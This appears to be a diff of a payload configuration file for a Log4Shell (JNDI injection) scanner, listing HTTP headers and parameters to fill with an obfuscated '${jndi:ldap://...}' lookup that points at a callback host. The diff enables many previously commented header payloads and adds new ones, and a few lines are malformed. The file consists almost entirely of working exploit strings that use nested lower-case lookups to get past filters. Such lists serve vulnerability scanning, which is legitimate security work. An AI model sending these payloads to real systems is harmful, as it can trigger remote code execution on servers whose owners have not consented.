@@ -16,25 +16,26 @@
 #param,referrer,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
 # %h is replaced with corresponding Host header
 # Useful in cases like Host, Origin, etc.
-#header,Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}:80@%h
+# header,Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}:80@%h
 header,Contact,root@${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
 header,From,root@${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
 header,User-Agent,Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 root@${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
+header,X-Api-Version:,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
 header,Referer,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/ref
-#header,X-Original-URL,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
+header,X-Original-URL,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
 header,X-Wap-Profile,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/wap.xml
-#header,Profile,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/wap.xml
-#header,X-Arbitrary,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
-#header,X-HTTP-DestinationURL,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
-#header,X-Forwarded-Proto,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
-#header,Origin,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
-#header,X-Forwarded-Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
-#header,X-Forwarded-Server,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
-#header,X-Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
-#header,Proxy-Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
-#header,Destination,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
-#header,Proxy,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
-#header,Via,1.1 ${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
+header,Profile,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/wap.xml
+header,X-Arbitrary,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
+header,X-HTTP-DestinationURL,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/
+header,X-Forwarded-Proto,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}/header,
+# Origin,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}@%h
+# header,X-Forwarded-Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
+header,X-Forwarded-Server,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
+header,X-Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
+header,Proxy-Host,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
+header,Destination,${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
+header,Proxy,http://${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
+header,Via,1.1 ${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
 header,X-Forwarded-For,spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
 header,True-Client-IP,spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
 header,Client-IP,spoofed.${jn${lower:d}i:l${lower:d}ap://${lower:x}${lower:f}.%s/a}
